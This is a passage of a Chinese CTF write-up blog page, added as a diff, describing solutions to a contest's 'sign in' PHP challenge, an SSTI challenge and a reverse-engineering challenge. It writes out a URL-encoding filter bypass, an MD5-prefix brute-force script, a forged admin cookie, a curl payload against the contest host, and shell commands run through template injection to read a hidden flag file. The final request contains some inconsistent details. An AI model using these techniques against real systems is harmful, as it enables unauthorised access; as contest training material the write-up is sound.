@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>淘汰赛 | Welcome！This is Oight！</title><meta name="author" content="Oight"><meta name="copyright" content="Oight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.sign in&lt;?php error_reporting(0); include_once &#39;flag.php&#39;; if ($_SERVER[&#39;QUERY_STRING&#39;]) &#123;     if (preg_match(&quot;&#x2F;[A-Za-z]+&#x2F;&quot;, $_SERVER[&#39;QUERY_STRING&#39;])) &amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="淘汰赛">
+<meta property="og:url" content="http://oight.github.io/posts/6670da2/index.html">
+<meta property="og:site_name" content="Welcome！This is Oight！">
+<meta property="og:description" content="1.sign in&lt;?php error_reporting(0); include_once &#39;flag.php&#39;; if ($_SERVER[&#39;QUERY_STRING&#39;]) &#123;     if (preg_match(&quot;&#x2F;[A-Za-z]+&#x2F;&quot;, $_SERVER[&#39;QUERY_STRING&#39;])) &amp;#123">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://oight.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-03-09T13:18:57.000Z">
+<meta property="article:modified_time" content="2025-03-09T13:34:56.317Z">
+<meta property="article:author" content="Oight">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://oight.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://oight.github.io/posts/6670da2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '淘汰赛',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Welcome！This is Oight！</span></a><a class="nav-page-title" href="/"><span class="site-name">淘汰赛</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">淘汰赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-09T13:18:57.000Z" title="发表于 2025-03-09 21:18:57">2025-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-09T13:34:56.317Z" title="更新于 2025-03-09 21:34:56">2025-03-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-sign-in"><a href="#1-sign-in" class="headerlink" title="1.sign in"></a>1.sign in</h1><pre><code>&lt;?php
+error_reporting(0);
+include_once &#39;flag.php&#39;;
+if ($_SERVER[&#39;QUERY_STRING&#39;]) &#123;
+    if (preg_match(&quot;/[A-Za-z]+/&quot;, $_SERVER[&#39;QUERY_STRING&#39;])) &#123;
+        die(&quot;I hate English!&quot;);
+    &#125;
+    if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &quot;ba3f&quot; || $_GET[&#39;hi&#39;] !== &quot;web&quot;) &#123;
+        die(&quot;Oops! It&#39;s wrong!&quot;);
+    &#125;
+    if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) &#123;
+        die(&quot;You are not admin!&quot;);
+    &#125;
+    locate();
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p>三层过滤<br>以下是对该PHP代码的详细解释及解题思路：</p>
+<hr>
+<h3 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="代码逻辑分析"></a><strong>代码逻辑分析</strong></h3><ol>
+<li><p><strong>错误报告与文件包含</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);            <span class="comment">// 关闭错误显示</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;       <span class="comment">// 包含flag文件（关键目标）</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>查询字符串检查</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// 检查查询字符串是否包含字母</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z]+/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;I hate English!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他条件...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="comment">// 无查询字符串时显示源码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>漏洞点</strong>：<code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 是原始未解码的字符串，可通过URL编码绕过字母检测。</li>
+</ul>
+</li>
+<li><p><strong>MD5校验与参数检查</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nsilab&#x27;</span>]), <span class="number">0</span>, <span class="number">4</span>) !== <span class="string">&quot;ba3f&quot;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;hi&#x27;</span>] !== <span class="string">&quot;web&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Oops! It&#x27;s wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>要求POST参数 <code>nsilab</code> 的MD5值前4位为 <code>ba3f</code>。</li>
+<li>GET参数 <code>hi</code> 必须等于 <code>web</code>。</li>
+</ul>
+</li>
+<li><p><strong>Cookie权限校验</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are not admin!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>需设置Cookie <code>user=admin</code>。</li>
+</ul>
+</li>
+<li><p><strong>成功条件</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">locate</span>();  <span class="comment">// 猜测此函数会输出flag</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a><strong>解题步骤</strong></h3><h4 id="1-绕过查询字符串字母检测"><a href="#1-绕过查询字符串字母检测" class="headerlink" title="1. 绕过查询字符串字母检测"></a><strong>1. 绕过查询字符串字母检测</strong></h4><ul>
+<li><strong>目标</strong>：传递 <code>hi=web</code>，但确保 <code>QUERY_STRING</code> 无字母。</li>
+<li><strong>方法</strong>：将参数名和值URL编码为十六进制形式：<ul>
+<li><code>hi</code> → <code>%68%69</code>（h的ASCII码是0x68，i是0x69）</li>
+<li><code>web</code> → <code>%77%65%62</code>（w&#x3D;0x77, e&#x3D;0x65, b&#x3D;0x62）</li>
+</ul>
+</li>
+<li><strong>构造查询字符串</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%68%69=%77%65%62</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 为 <code>%68%69=%77%65%62</code>（无字母）。</li>
+<li>PHP自动解码后，<code>$_GET[&#39;hi&#39;]</code> 为 <code>web</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-碰撞MD5前4位为ba3f"><a href="#2-碰撞MD5前4位为ba3f" class="headerlink" title="2. 碰撞MD5前4位为ba3f"></a><strong>2. 碰撞MD5前4位为<code>ba3f</code></strong></h4><ul>
+<li><strong>目标</strong>：找到字符串 <code>nsilab</code>，满足 <code>md5(nsilab)[0:4] == &quot;ba3f&quot;</code>。</li>
+<li><strong>暴力破解脚本</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;ba3f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i)</span><br><span class="line">    hash_md5 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> hash_md5.startswith(target):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;s&#125;</span> → <span class="subst">&#123;hash_md5&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  // Found: <span class="number">35350</span> → ba3fe3d296f3e7269b66f163d31b3dc3</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>示例结果</strong>：<code>nsilab=35350</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-设置管理员Cookie"><a href="#3-设置管理员Cookie" class="headerlink" title="3. 设置管理员Cookie"></a><strong>3. 设置管理员Cookie</strong></h4><ul>
+<li><strong>添加Cookie</strong>：<code>user=admin</code>。</li>
+</ul>
+<h4 id="4-发送完整请求"><a href="#4-发送完整请求" class="headerlink" title="4. 发送完整请求"></a><strong>4. 发送完整请求</strong></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?%68%69=%77%65%62</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=admin</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">nsilab</span><span class="operator">=</span><span class="number">12345</span></span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a><strong>漏洞总结</strong></h3><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>利用方法</th>
+<th>防御建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL编码绕过</td>
+<td>参数名和值URL编码为十六进制</td>
+<td>检查解码后的参数</td>
+</tr>
+<tr>
+<td>MD5弱校验</td>
+<td>暴力碰撞前4位</td>
+<td>使用强哈希（如SHA-256）</td>
+</tr>
+<tr>
+<td>Cookie权限控制不严</td>
+<td>直接设置Cookie为<code>user=admin</code></td>
+<td>服务端Session管理或签名Cookie</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="最终Payload示例"><a href="#最终Payload示例" class="headerlink" title="最终Payload示例"></a><strong>最终Payload示例</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://contest.ctf.nefu.edu.cn:33079/&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Cookie: user=admin&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;nsilab=35350&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功触发后，服务器会执行 <code>locate()</code> 函数并返回flag。</p>
+<h1 id="2-ezssti"><a href="#2-ezssti" class="headerlink" title="2.ezssti"></a>2.ezssti</h1><p>输入49<br>发现可以SSTI<br>使用焚靖<br>get 方法传name</p>
+<blockquote>
+<p>cd .. &amp;&amp; ls -a</p>
+</blockquote>
+<p>得到隐藏的<code>.flll4ggggg</code>文件<br>用<code>tac /.flll4ggggg</code>得到<code>flag</code></p>
+<h1 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h1><h2 id="学姐手把手教学，效果显著（）"><a href="#学姐手把手教学，效果显著（）" class="headerlink" title="学姐手把手教学，效果显著（）"></a>学姐手把手教学，效果显著（）</h2><blockquote>
+<p>灵感来源：<a target="_blank" rel="noopener" href="https://github.com/JuliaPoo/Artfuscator">Artfuscator</a> </p>
+</blockquote>
+<p>IDA打开，进入main函数</p>
+<p>Ctrl 加滚轮放大  </p>
+<p>就能看到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://oight.github.io">Oight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://oight.github.io/posts/6670da2/">http://oight.github.io/posts/6670da2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://oight.github.io" target="_blank">Welcome！This is Oight！</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WP/">WP</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/bba757cf/" title="原型链污染"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">原型链污染</div></div><div class="info-2"><div class="info-item-1">原型链污染什么是原型链污染？原型链污染是一种针对JavaScript运行时的注入攻击。 在 JavaScript 中，通过修改对象的原型（prototype），让所有继承该原型的对象都“被动继承”这些修改，可能导致意外行为或安全漏洞。 通过原型链污染，攻击者可以控制对象属性的默认值，从而篡改应用程序的逻辑并可能导致服务被拒绝，甚至在某些极端情况下远程执行代码。 通俗地讲，想想你是一家车厂的老板，所有汽车都按照一个 标准模板 生成，这个模板就是 __原型__。有一天，有人在模板上偷偷画了个鬼脸，结果之后生产的每辆车都带着这个鬼脸——这就是原型链污染。 为什么会发生原型链污染？ 原型链机制  JavaScript 中对象可以继承属性和方法。为了使得在编写程序时更加简便，避免由于方法绑定到对象上在使用时多次调用，利用原型（prototype）就可以使得所有用同一类来实例化的对象可以直接拥有这个类中的所有内容，包括属性和方法。 JavaScript 中的继承机制： 1234567891011121314funtion Father() &#123;    this.first_name...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Oight</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Oight"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-sign-in"><span class="toc-number">1.</span> <span class="toc-text">1.sign in</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">1.0.1.</span> <span class="toc-text">代码逻辑分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.0.2.</span> <span class="toc-text">解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BB%95%E8%BF%87%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%97%E6%AF%8D%E6%A3%80%E6%B5%8B"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">1. 绕过查询字符串字母检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%A2%B0%E6%92%9EMD5%E5%89%8D4%E4%BD%8D%E4%B8%BAba3f"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">2. 碰撞MD5前4位为ba3f</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%BE%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98Cookie"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">3. 设置管理员Cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%91%E9%80%81%E5%AE%8C%E6%95%B4%E8%AF%B7%E6%B1%82"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">4. 发送完整请求</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">1.0.3.</span> <span class="toc-text">漏洞总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Payload%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.0.4.</span> <span class="toc-text">最终Payload示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-ezssti"><span class="toc-number">2.</span> <span class="toc-text">2.ezssti</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Art"><span class="toc-number">3.</span> <span class="toc-text">Art</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E5%A7%90%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E5%AD%A6%EF%BC%8C%E6%95%88%E6%9E%9C%E6%98%BE%E8%91%97%EF%BC%88%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">学姐手把手教学，效果显著（）</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6670da2/" title="淘汰赛">淘汰赛</a><time datetime="2025-03-09T13:18:57.000Z" title="发表于 2025-03-09 21:18:57">2025-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/bba757cf/" title="原型链污染">原型链污染</a><time datetime="2025-03-05T12:37:44.000Z" title="发表于 2025-03-05 20:37:44">2025-03-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/9e349d62/" title="Python沙箱逃逸（未完成）">Python沙箱逃逸（未完成）</a><time datetime="2025-01-30T08:35:43.000Z" title="发表于 2025-01-30 16:35:43">2025-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f66dca92/" title="Python反序列化">Python反序列化</a><time datetime="2025-01-30T04:24:21.000Z" title="发表于 2025-01-30 12:24:21">2025-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/49ae7cb9/" title="archlinux">archlinux</a><time datetime="2025-01-07T06:28:25.000Z" title="发表于 2025-01-07 14:28:25">2025-01-07</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Oight</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
